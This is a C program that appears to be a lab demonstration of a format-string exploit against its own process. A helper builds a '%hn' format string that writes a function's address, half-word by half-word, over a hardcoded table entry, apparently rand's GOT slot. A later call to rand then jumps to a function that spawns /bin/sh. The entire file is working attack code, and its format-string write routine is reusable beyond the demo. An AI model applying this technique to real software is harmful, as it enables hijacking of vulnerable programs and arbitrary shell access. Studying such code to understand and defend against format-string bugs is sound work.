#include <stdio.h>
#include <string.h>

int c2i(char ch)
{
    if(isdigit(ch))
        return ch - 48;
 
    if( ch < 'A' || (ch > 'F' && ch < 'a') || ch > 'z' )
        return -1;
 
    if(isalpha(ch))
        return isupper(ch) ? ch - 55 : ch - 87;
 
    return -1;
}

int calChars(int write_byte, int already_written)
{
	int wb = write_byte;
	wb += 0x10000;
	int aw = already_written;
	aw %= 0x10000;
	int padding = (wb - aw) % 0x10000;
	if(padding == 0)
		padding += 0x10000;
	return padding;
}

void overwriteAddr(int targetAddr, char* addrValue)
{
	int i, a, paralen;
	char cmd[128];
	char subcmd[32];
	char ap[16];
	int counter = 0;
	strcpy(cmd, "");
	
	a = c2i(addrValue[4])*4096+c2i(addrValue[5])*256+c2i(addrValue[6])*16+c2i(addrValue[7]);
	paralen = calChars(a, counter);
	counter = a;
	sprintf(ap, "%d", paralen);
	strcpy(subcmd, "%1$");
	strcat(subcmd, ap);
	strcat(subcmd, "u%2$hn");
	strcat(cmd, subcmd);

	a = c2i(addrValue[0])*4096+c2i(addrValue[1])*256+c2i(addrValue[2])*16+c2i(addrValue[3]);
	paralen = calChars(a, counter);
	counter = a;
	sprintf(ap, "%d", paralen);
	strcpy(subcmd, "%1$");
	strcat(subcmd, ap);
	strcat(subcmd, "u%3$hn");
	strcat(cmd, subcmd);

	//printf("%s\n", cmd);
	printf(cmd, 1, targetAddr, targetAddr+2);
}

//entry : 0x08048889
void hijack()
{
	printf("%s\n", "i am hijack");
	char *name[2];
	name[0] = "/bin/sh";
	name[1] = NULL;
	execve(name[0], name, NULL);
}

void foo()
{
	char buf[64];
	strcpy(buf, "hello world");
	printf("\n%s\n", buf);
	int r = rand();
	printf("the rannum is : %d\n", r);
}

int main(int argc, char const *argv[])
{
	
	int target_addr = 0x08049cf8;
	char addr_value[8] = "08048889";
	overwriteAddr(target_addr, addr_value);
	

	foo();
	return 0;
}